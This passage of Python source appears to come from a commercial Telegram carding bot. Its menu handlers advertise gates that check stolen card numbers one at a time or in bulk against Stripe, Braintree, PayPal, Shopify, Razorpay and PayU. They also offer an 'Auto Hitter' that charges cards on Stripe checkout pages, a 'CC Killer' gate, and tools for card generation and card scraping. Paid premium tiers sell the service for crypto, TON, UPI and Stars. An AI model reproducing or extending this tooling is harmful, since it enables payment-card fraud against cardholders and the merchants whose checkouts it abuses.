    # Row 2: Braintree   | VBV/3DS
    # Row 3: PayPal      | Auto Shopify
    # Row 4: Razorpay    | Shopify V2
    # Row 5: Stripe $1   | Auto Hitter
    # Row 6: ◀ BACK
    # ============================================================
    if query.data == "gates":
        keyboard = [
            [_btn("Auto Stripe Auth", icon=EID["bolt"], callback_data="gate_ast"), _btn("Stripe $5", icon=EID["card"], callback_data="gate_stripe5")],
            [_btn("Braintree", icon=EID["bolt"], callback_data="gate_braintree"), _btn("VBV/3DS", icon=EID["3ds"], callback_data="gate_vbv3ds")],
            [_btn("Stripe Auth", icon=EID["bolt"], callback_data="gate_stripe_newrp"), _btn("Stripe $1", icon=EID["card"], callback_data="gate_stripe1")],
            [_btn("PayPal", icon=EID["card"], callback_data="gate_paypal"), _btn("Auto Shopify", icon=EID["bolt"], callback_data="gate_auto_shopify")],
            [_btn("Razorpay", icon=EID["card"], callback_data="gate_razorpay"), _btn("Shopify V2", icon=EID["bolt"], callback_data="gate_shopify_v2")],
            [_btn("PayU ₹1", icon=EID["card"], callback_data="gate_payu"), _btn("CC Killer", icon=EID["danger"], callback_data="gate_cc_killer")],
            [_btn("Auto Hitter", icon=EID["bolt"], callback_data="gate_auto_hitter")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption="<b>Select a Gate</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit("<b>Select a Gate</b>", reply_markup)
    
    # Individual Gate Info Screens
    elif query.data == "gate_stripe5":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>Stripe $5</b>

▸ /st5 cc|mm|yy|cvv — Single Check
▸ /mst5 — Mass Check"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_braintree":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>Braintree</b>

▸ /b3 cc|mm|yy|cvv — Single Check
▸ /b3n cc|mm|yy|cvv — Braintree $5.00
▸ /mb3 — Mass Check"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_ast":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>Auto Stripe Auth</b>

▸ /ast cc|mm|yy|cvv — Single Check
▸ /mast — Mass Check (5 batches)"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_vbv3ds":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>VBV/3DS</b>

▸ /bt3d cc|mm|yy|cvv — Single Check
▸ /mbt3d — Mass Check"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_paypal":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>PayPal</b>

▸ /pp cc|mm|yy|cvv — Single Check
▸ /ppv cc|mm|yy|cvv — Variable Price ($0.01)
▸ /mpp — Mass Check"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_auto_shopify":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>Shopify</b>

▸ /sh cc|mm|yy|cvv — Single Check
▸ /msh — Mass Check
▸ /mshtxt — Mass Check via .txt file"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_stripe_newrp":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>Stripe Auth</b>

▸ /st cc|mm|yy|cvv — Single Check
▸ /str cc|mm|yy|cvv — Stripe $1 Donation
▸ /mst — Mass Check (5 batches)
▸ /msttxt — Mass Check via .txt file"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_razorpay":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>Razorpay ₹1</b>

▸ /rz cc|mm|yy|cvv — Single Check
▸ /mrz — Mass Check (5 batches)"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_payu":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = ae("""<b>PayU ₹1</b>

▸ /payu cc|mm|yy|cvv — Single Check
▸ /mpayu — Mass Check (1s delay)

💡 Uses MiracleManna donation gateway""")
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_shopify_v2":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>Shopify V2</b>

▸ /sh6 cc|mm|yy|cvv — Single Check
▸ /msh6 — Mass Check"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_stripe1":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>Stripe $1</b>

▸ /st1 cc|mm|yy|cvv — Single Check
▸ /mst1 — Mass Check"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_auto_hitter":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = """<b>Auto Hitter (Stripe Checkout)</b>

▸ /co url — Parse Stripe checkout URL
▸ /co url cc|mm|yy|cvv — Charge card on checkout

<b>Settings:</b>
▸ /setmail email — Set billing email
▸ /capkey key — Set captcha solver API key

<b>Supported URLs:</b>
• checkout.stripe.com
• buy.stripe.com

<b>Example:</b>
<code>/co https://checkout.stripe.com/c/pay/cs_live_xxx</code>
<code>/co https://checkout.stripe.com/... 4242424242424242|12|25|123</code>"""
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    elif query.data == "gate_cc_killer":
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = ae("""<b>💀 CC Killer Gate</b>

▸ /kill cc|mm|yy|cvv — Kill a card

<b>Description:</b>
Uses bli-us.com membership gateway to check cards with multi-threaded requests.

<b>Response Format:</b>
• Processed (X) ✅🔥 — Card is dead/killed
• Card is still live try again 😭 — Card is live

<b>Example:</b>
<code>/kill 4242424242424242|12|25|123</code>""")
        gif_url = get_sexy_anime_gif("welcome")
        try:
            await query.message.delete()
            await context.bot.send_animation(
                chat_id=query.message.chat_id,
                animation=gif_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=reply_markup
            )
        except:
            await safe_edit(text, reply_markup)
    
    # AUTH GATES
    elif query.data == "auth_gates":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • FREE GATES</b>
{sep}
⚡ /ss — Stripe Auth $0.5
🌊 /bu — Braintree Auth $1
🔷 /sq — Square Auth $0
{sep}
<code>/ss cc|mm|yy|cvv</code>
/mss · /msstxt
{sep}""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # CHARGE GATES
    elif query.data == "charge_gates":
        if not is_premium(user.id):
            text = get_premium_denied_message(user.id)
            
            keyboard = [
                [_btn("Buy Premium", icon=EID["crown"], url=f"https://t.me/{SUPPORT_USERNAME}")],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]
            ]
        else:
            sep = "━━━━━━━━━━━━━━━━━━━━"
            text = ae(f"""💜 <b>ONICHAN • PREMIUM GATES</b>
{sep}
💰 /pp PayPal $1
⚡ /sor $2 · /st5 $5 · /st12 $12 · /str $15 · /dep $49
🏛 /auz $0 · /asd $7 · /atf $25 · /anh $200
🛍 /sh6 $6 · /sh8 $8 · /sh10 $10 · /sh13 $13
🌊 /bt1 $1 · /bt3d 3D
📱 /stm Mass Auth
{sep}""")
            
            keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # MASS CHECK INFO
    elif query.data == "mass_info":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • MASS CHECK</b>
{sep}
📊 Free:5 | Premium:20 | Owner:50
{sep}
<code>/mass ss
cc1|mm|yy|cvv
cc2|mm|yy|cvv</code>
{sep}
⚡ /mss · /mbu · /msq · /mpp · /msor
📁 /msstxt · /mpptxt · /mbutxt
{sep}
💎 @{SUPPORT_USERNAME}""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # TOOLS MENU
    elif query.data == "tools":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • TOOLS</b>
{sep}
🎴 /gen 424242 — Card Generator
🔍 /bin 424242 — BIN Lookup
🧹 /clean — CC Cleaner
📡 /scr channel — CC Scraper
{sep}
✨ All tools are free!""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # INFO
    elif query.data == "info":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • INFO</b>
{sep}
📛 <b>Name</b>   : {user.first_name}
👤 <b>User</b>   : @{user.username or 'None'}
🆔 <b>ID</b>     : <code>{user.id}</code>
💎 <b>Status</b> : {rank}
{sep}
⚡ @{BOT_USERNAME}""")
        
        keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # PREMIUM INFO
    elif query.data == "premium":
        sep = "━━━━━━━━━━━━━━━━━━━━"
        text = ae(f"""💜 <b>ONICHAN • PREMIUM</b>
{sep}
📦 <b>1 Week</b>   — $3
📦 <b>2 Weeks</b>  — $5
📦 <b>1 Month</b>  — $10 ⭐
📦 <b>3 Months</b> — $25
{sep}
✅ 20 mass cards · All gates · No cooldown
{sep}
💳 Choose payment method:""")
        
        keyboard = [
            [_btn("Pay with TON", icon=EID["crown"], callback_data="pay_ton")],
            [_btn("Pay with Stars", icon=EID["bolt"], callback_data="pay_stars")],
            [_btn("Pay with Crypto", icon=EID["card"], callback_data="pay_crypto")],
            [_btn("Pay with UPI", icon=EID["card"], callback_data="pay_upi")],
            [_btn("Contact Owner", style="default", icon=EID["users"], url=f"https://t.me/{SUPPORT_USERNAME}")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # PAY WITH UPI (Easebuzz)
    elif query.data == "pay_upi":
        from modules.easebuzz import UPI_PLANS
        import os
        
        easebuzz_key = os.environ.get('EASEBUZZ_KEY', '')
        if not easebuzz_key:
            text = ae("""🇮🇳 <b>UPI PAYMENT</b>

━━━━━━━━━━━━━━━━━━━━━━

⚠️ UPI payments are currently unavailable.
Please use Crypto or Telegram Stars instead.

━━━━━━━━━━━━━━━━━━━━━━""")
            keyboard = [
                [_btn("Pay with Crypto", icon=EID["card"], callback_data="pay_crypto")],
                [_btn("Pay with Stars", icon=EID["bolt"], callback_data="pay_stars")],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
            ]
        else:
            text = """🇮🇳 <b>PAY WITH UPI</b>

━━━━━━━━━━━━━━━━━━━━━━

Pay instantly with any UPI app!
GPay, PhonePe, Paytm, BHIM & more

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>1 Week</b> - ₹99
📦 <b>2 Weeks</b> - ₹149
📦 <b>1 Month</b> - ₹249 (Best!)
📦 <b>3 Months</b> - ₹599

━━━━━━━━━━━━━━━━━━━━━━"""
            keyboard = [
                [_btn("1 Week - ₹99", icon=EID["card"], callback_data="upi_1_week")],
                [_btn("2 Weeks - ₹149", icon=EID["card"], callback_data="upi_2_weeks")],
                [_btn("1 Month - ₹249", icon=EID["crown"], callback_data="upi_1_month")],
                [_btn("3 Months - ₹599", icon=EID["card"], callback_data="upi_3_months")],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
            ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # UPI PAYMENT (Easebuzz)
    elif query.data.startswith("upi_"):
        plan_key = query.data.replace("upi_", "")
        
        from modules.easebuzz import UPI_PLANS, create_payment
        import os
        
        if plan_key not in UPI_PLANS:
            await query.answer("Invalid plan!", show_alert=True)
            return
        
        await query.answer("Creating UPI payment...", show_alert=False)
        
        domain = os.environ.get("REPLIT_DEPLOYMENT_URL") or os.environ.get("REPLIT_DEV_DOMAIN", "")
        if domain and not domain.startswith("http"):
            domain = f"https://{domain}"
        
        success_url = f"{domain}/webhook/easebuzz/success" if domain else ""
        failure_url = f"{domain}/webhook/easebuzz/failure" if domain else ""
        
        result = create_payment(
            user_id=user.id,
            plan_key=plan_key,
            username=user.username or user.first_name or "User",
            success_url=success_url,
            failure_url=failure_url
        )
        
        if result.get("success"):
            plan = UPI_PLANS[plan_key]
            text = ae(f"""🇮🇳 <b>UPI PAYMENT ORDER</b>

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan['name']}
💵 <b>Amount:</b> {plan['inr']}
⏰ <b>Duration:</b> {plan['duration_days']} days

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Order ID:</b> <code>{result['txnid']}</code>

━━━━━━━━━━━━━━━━━━━━━━

🏧 <b>Pay with GPay, PhonePe, Paytm!</b>

✅ Premium activates automatically!
⏰ Order expires in 15 minutes

━━━━━━━━━━━━━━━━━━━━━━""")
            
            keyboard = [
                [_btn("Pay Now (UPI)", icon=EID["card"], url=result['payment_url'])],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
            ]
        else:
            text = ae(f"""❌ <b>UPI Payment Error</b>

{result.get('error', 'Unknown error')}

Please try again or use another payment method.""")
            keyboard = [
                [_btn("Pay with Crypto", icon=EID["card"], callback_data="pay_crypto")],
                [_btn("Pay with Stars", icon=EID["bolt"], callback_data="pay_stars")],
                [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
            ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # PAY WITH CRYPTO
    elif query.data == "pay_crypto":
        text = ae("""🪙 <b>PAY WITH CRYPTO</b>

━━━━━━━━━━━━━━━━━━━━━━

Select your plan to pay with:
BTC, ETH, USDC, LTC, BCH, DOGE & more!

━━━━━━━━━━━━━━━━━━━━━━""")
        
        keyboard = [
            [_btn("1 Week - $3", icon=EID["card"], callback_data="buy_1_week")],
            [_btn("2 Weeks - $5", icon=EID["card"], callback_data="buy_2_weeks")],
            [_btn("1 Month - $10", icon=EID["crown"], callback_data="buy_1_month")],
            [_btn("3 Months - $25", icon=EID["card"], callback_data="buy_3_months")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # PAY WITH TELEGRAM STARS
    elif query.data == "pay_stars":
        text = ae("""⭐ <b>PAY WITH TELEGRAM STARS</b>

━━━━━━━━━━━━━━━━━━━━━━

Pay directly in Telegram!
Fast, secure, no crypto needed.

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>1 Week</b> - 150 ⭐
📦 <b>2 Weeks</b> - 250 ⭐
📦 <b>1 Month</b> - 500 ⭐ (Best!)
📦 <b>3 Months</b> - 1250 ⭐

━━━━━━━━━━━━━━━━━━━━━━""")
        
        keyboard = [
            [_btn("1 Week - 150 Stars", icon=EID["bolt"], callback_data="stars_1_week")],
            [_btn("2 Weeks - 250 Stars", icon=EID["bolt"], callback_data="stars_2_weeks")],
            [_btn("1 Month - 500 Stars", icon=EID["crown"], callback_data="stars_1_month")],
            [_btn("3 Months - 1250 Stars", icon=EID["bolt"], callback_data="stars_3_months")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # TELEGRAM STARS PAYMENT
    elif query.data.startswith("stars_"):
        plan_key = query.data.replace("stars_", "")
        
        stars_prices = {
            "1_week": 150,
            "2_weeks": 250,
            "1_month": 500,
            "3_months": 1250
        }
        
        plan_names = {
            "1_week": "1 Week Premium",
            "2_weeks": "2 Weeks Premium",
            "1_month": "1 Month Premium",
            "3_months": "3 Months Premium"
        }
        
        if plan_key not in stars_prices:
            await query.answer("Invalid plan!", show_alert=True)
            return
        
        await query.answer("Creating Stars invoice...", show_alert=False)
        
        from telegram import LabeledPrice
        
        try:
            await context.bot.send_invoice(
                chat_id=user.id,
                title=plan_names[plan_key],
                description=f"Unlock premium features for Onichan Bot",
                payload=f"premium_{plan_key}_{user.id}",
                provider_token="",
                currency="XTR",
                prices=[LabeledPrice(label=plan_names[plan_key], amount=stars_prices[plan_key])]
            )
        except Exception as e:
            print(f"[Stars] Invoice error: {e}")
            await safe_edit(
                f"❌ <b>Error creating Stars invoice</b>\n\n{str(e)[:100]}\n\nPlease try Crypto payment instead.",
                InlineKeyboardMarkup([
                    [_btn("Pay with Crypto", icon=EID["card"], callback_data="pay_crypto")],
                    [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
                ])
            )
    
    # PAY WITH TON — plan picker
    elif query.data == "pay_ton":
        from config import TON_WALLET
        wallet_display = f"<code>{html.escape(TON_WALLET)}</code>" if TON_WALLET else "⚠️ <i>Not configured yet — contact owner</i>"
        text = (
            f"💎 <b>PAY WITH TON</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Fast, decentralised payment on The Open Network.\n"
            f"No account required — just your TON wallet!\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📦 <b>1 Week</b>   — 0.6 TON\n"
            f"📦 <b>2 Weeks</b>  — 1.0 TON\n"
            f"📦 <b>1 Month</b>  — 2.0 TON ⭐\n"
            f"📦 <b>3 Months</b> — 5.0 TON\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💼 <b>Wallet:</b> {wallet_display}\n\n"
            f"Select a plan to get the exact amount and payment instructions."
        )
        keyboard = [
            [_btn("1 Week — 0.6 TON", icon=EID["card"], callback_data="ton_1_week")],
            [_btn("2 Weeks — 1.0 TON", icon=EID["card"], callback_data="ton_2_weeks")],
            [_btn("1 Month — 2.0 TON", icon=EID["crown"], callback_data="ton_1_month")],
            [_btn("3 Months — 5.0 TON", icon=EID["card"], callback_data="ton_3_months")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
        ]
        await safe_edit(text, InlineKeyboardMarkup(keyboard))

    # TON PLAN SELECTED — show wallet + auto-monitor instructions
    elif query.data.startswith("ton_"):
        plan_key = query.data[4:]  # strip "ton_"
        if plan_key not in TON_PLANS:
            await query.answer("Invalid plan!", show_alert=True)
            return
        plan = TON_PLANS[plan_key]
        from config import TON_WALLET
        if not TON_WALLET:
            await query.answer("TON payments not configured yet. Contact the owner.", show_alert=True)
            return
        await query.answer("Loading payment details...", show_alert=False)

        # Register in monitor — uses user's Telegram ID as the payment comment
        _ton_monitor.add_pending(
            user_id=user.id,
            plan_key=plan_key,
            name=plan["name"],
            duration_days=plan["duration_days"],
            ton_amount=plan["ton"],
        )

        uid_str = str(user.id)
        text = (
            f"💎 <b>TON PAYMENT</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📦 <b>Plan:</b> {plan['name']}\n"
            f"💎 <b>Amount:</b> <b>{plan['ton']} TON</b>\n"
            f"⏰ <b>Duration:</b> {plan['duration_days']} days\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💼 <b>Send to this wallet:</b>\n"
            f"<code>{html.escape(TON_WALLET)}</code>\n\n"
            f"💬 <b>Comment / Memo (required):</b>\n"
            f"<code>{uid_str}</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>📋 Steps:</b>\n"
            f"1️⃣ Open Tonkeeper, @wallet or any TON app\n"
            f"2️⃣ Send exactly <b>{plan['ton']} TON</b> to the wallet above\n"
            f"3️⃣ In the <b>Comment / Memo</b> field enter: <code>{uid_str}</code>\n"
            f"4️⃣ Confirm the transaction\n\n"
            f"✅ <b>Premium activates automatically</b> within ~30 seconds!"
        )
        keyboard = [
            [_btn("BACK", style="default", icon=EID["back"], callback_data="pay_ton")]
        ]
        await safe_edit(text, InlineKeyboardMarkup(keyboard))

    # BUY PLAN - Create CoinPayments Order
    elif query.data.startswith("buy_"):
        plan_key = query.data.replace("buy_", "")
        
        if plan_key not in CRYPTO_PLANS:
            await query.answer("Invalid plan!", show_alert=True)
            return
        
        await query.answer("Creating payment...", show_alert=False)
        
        import os
        domain = os.environ.get("REPLIT_DEPLOYMENT_URL") or os.environ.get("REPLIT_DEV_DOMAIN", "")
        if domain and not domain.startswith("http"):
            domain = f"https://{domain}"
        callback_url = f"{domain}/webhook/oxapay" if domain else None
        
        result = cp_create_order(
            user_id=user.id,
            username=user.username or user.first_name or "User",
            plan_key=plan_key,
            crypto="USDT",
            callback_url=callback_url
        )
        
        if result.get("error"):
            await safe_edit(
                f"❌ <b>Payment Error</b>\n\n{result['error']}\n\nPlease contact @{SUPPORT_USERNAME}",
                InlineKeyboardMarkup([
                    [_btn("Contact Support", style="default", icon=EID["users"], url=f"https://t.me/{SUPPORT_USERNAME}")],
                    [_btn("BACK", style="default", icon=EID["back"], callback_data="premium")]
                ])
            )
            return
        
        plan = result['plan']
        payment_url = result.get('payment_url', '')
        order_id = result.get('order_id', result.get('txn_id', ''))
        
        text = ae(f"""💳 <b>CRYPTO PAYMENT ORDER</b>

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan['name']}
💵 <b>Amount:</b> ${plan['price']} USD
⏰ <b>Duration:</b> {plan['duration_days']} days

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Order ID:</b> <code>{order_id}</code>

━━━━━━━━━━━━━━━━━━━━━━

🪙 <b>Pay with BTC, LTC, ETH, USDT & more!</b>

✅ Premium activates automatically!
⏰ Order expires in 1 hour

━━━━━━━━━━━━━━━━━━━━━━""")
        
        keyboard = []
        if payment_url:
            keyboard.append([_btn("Pay Now", icon=EID["card"], url=payment_url)])
        keyboard.append([_btn("Check Status", style="success", icon=EID["regenerate"], callback_data=f"check_{order_id}")])
        keyboard.append([_btn("BACK", style="default", icon=EID["back"], callback_data="premium")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # CHECK PAYMENT STATUS
    elif query.data.startswith("check_"):
        order_id = query.data.replace("check_", "").replace("payment_", "")
        
        await query.answer("Checking payment status...", show_alert=False)
        
        from modules.oxapay import get_pending_payments
        all_pending = get_pending_payments()
        pending = next((p for p in all_pending if p.get("order_id") == order_id or p.get("track_id") == order_id), None)
        
        track_id = order_id
        if pending and pending.get("track_id"):
            track_id = pending["track_id"]
        
        result = cp_query_order(track_id)
        
        oxa_status = str(result.get("status", "")).lower()
        is_paid = oxa_status in ["paid", "confirming", "confirmed", "complete", "sending"]
        
        if is_paid and pending:
            plan = CRYPTO_PLANS.get(pending["plan_key"], {})
            days = plan.get("duration_days", 7)
            from datetime import timedelta
            expiry = datetime.now() + timedelta(days=days)
            cp_activate_premium(pending["user_id"], pending["plan_key"], pending.get("username", "User"), "OxaPay Crypto")
            cp_mark_complete(order_id, pending["user_id"], pending["plan_key"])
            text = ae(f"""✅ <b>PAYMENT CONFIRMED!</b>

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan.get('name', pending["plan_key"])}
📅 <b>Expires:</b> {expiry.strftime("%Y-%m-%d")}

━━━━━━━━━━━━━━━━━━━━━━

🎉 Your premium is now active!
Enjoy all premium features!""")
            
            keyboard = [
                [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
            ]
        elif is_paid:
            text = "✅ Payment confirmed! Your premium should be active."
            keyboard = [
                [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
            ]
        else:
            status = result.get("status", "Waiting")
            error = result.get("error", "")
            
            if error and "not found" in error.lower():
                text = ae(f"""⚠️ <b>ORDER NOT FOUND</b>

Order ID: <code>{order_id}</code>

This order may have expired or is invalid.""")
            else:
                payment_url = pending.get("payment_url", "") if pending else ""
                text = ae(f"""⏳ <b>PAYMENT PENDING</b>

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Order:</b> <code>{order_id}</code>
📊 <b>Status:</b> {status}

━━━━━━━━━━━━━━━━━━━━━━

Complete payment on OxaPay, then check again.""")
            
            keyboard = []
            if payment_url:
                keyboard.append([_btn("Pay Now", icon=EID["card"], url=payment_url)])
            keyboard.append([_btn("Check Again", style="success", icon=EID["regenerate"], callback_data=f"check_{order_id}")])
            keyboard.append([_btn("BACK", style="default", icon=EID["back"], callback_data="premium")])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # MY PAYMENTS - Show pending orders
    elif query.data == "my_payments":
        text = ae(f"""💳 <b>PAYMENT STATUS</b>

━━━━━━━━━━━━━━━━━━━━━━

Payments are verified manually.

📋 <b>Your User ID:</b> <code>{user.id}</code>

After sending payment, contact owner with:
• Your User ID
• Payment screenshot
• Plan purchased

Premium activates within 5 mins! ✅

━━━━━━━━━━━━━━━━━━━━━━""")
        
        keyboard = [
            [_btn("Contact Owner", style="default", icon=EID["users"], url=f"https://t.me/{SUPPORT_USERNAME}")],
            [_btn("Buy Premium", icon=EID["crown"], callback_data="premium")],
            [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await safe_edit(text, reply_markup)
    
    # ADMIN - ALL USERS LIST
    elif query.data == "admin_users":
        if not is_owner(user.id):
            await query.answer("Owner only!", show_alert=True)
            return
        
        try:
            with open(DB_OWNER, 'r') as f:
                owners = [l.strip() for l in f if l.strip()]
            with open(DB_PREMIUM, 'r') as f:
                premium = [l.strip().split()[0] for l in f if l.strip()]
            with open(DB_FREE, 'r') as f:
                free = [l.strip() for l in f if l.strip()]
        except:
            owners = premium = free = []
        
